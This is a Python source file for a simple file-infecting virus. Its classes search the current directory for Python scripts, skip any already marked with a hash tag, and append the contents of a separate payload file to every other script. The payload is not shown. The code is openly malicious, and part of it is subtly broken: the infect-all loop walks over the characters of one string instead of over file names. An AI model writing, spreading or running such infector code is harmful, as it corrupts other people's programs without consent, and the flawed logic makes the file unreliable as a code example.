import os
from FileOperations import FileOperations

class IdentifyTarget:
    '''
    Takes a file as input and checks if the file is ready to be infected with the virus.

    '''
    def __init__(self, file):
        self.file = file

    def is_script(self):
        '''
        We assert that a file is a script if it includes the statement "if __name__ == "__main__":". 
        Returns true if the statement is found.

        '''
        try:
            required_statement = 'if __name__ == "__main__":'
            if required_statement in FileOperations.read(self.file): 
                return True
            print("Could not verify file is python script; no {required_statement} statement.")
            return False
        except FileNotFoundError: raise FileNotFoundError(f"File {self.file} not found.")
    
    def is_infected(self):
        id = "# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d"
        try:
            if id in FileOperations.read(self.file):
                print("File is already infected.")
                return True    
            return False
        except FileNotFoundError: raise FileNotFoundError(f"File {self.file} not found.")
    
    def is_verified(self):
        ''' Runs is_script and is_infected, only returns 1 if is_script and not is_infected. '''
        if self.is_script() and not self.is_infected():  
            return 1
        print(f"Verification of {self.file} failed.\nQuitting...") 
        return 0



class Parasite:
    '''
    Finds python files to infect and injects them with the payload.

    '''
    def __init__(self, target_file=None, payload_file=None, output_path=None):
        self.target_file = target_file
        self.payload_file = payload_file
        self.output_path = output_path

        FileOperations.clear(self.output_path)
    
    
    def getPyFiles(self):
        ''' Gets pwd and writes all py files in the directory to output path. '''
        
        cwd = os.getcwd()

        for root, dir, files in os.walk(cwd):
            for file in files:
                if file.endswith(".py"):
                    FileOperations.append_to(self.output_path, f"{file}\n")

    def inject(self, file=None):
        ''' Injects the payload into the target file. '''
        if file is None: file = self.target_file
        verified = IdentifyTarget(file).is_verified()
        if not verified: return 1
        print(f"Injecting {file}...\n")
        FileOperations.append_to(file, f"\n# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d\n")
        FileOperations.append_to(file, FileOperations.read(self.payload_file))  
        return 0

    def inject_all(self):
        '''
        **WARNING** This function will infect all python files in the current directory with the payload.

        Targets ALL files in the current directory. 
        
        '''
        self.getPyFiles()

        cwd_targets = FileOperations.read(self.output_path).split("\n").pop()
        print(cwd_targets)
        
        for py_file in cwd_targets:
            if py_file != "Parasite.py":
                self.inject(py_file)
                print(f"{py_file} infected.")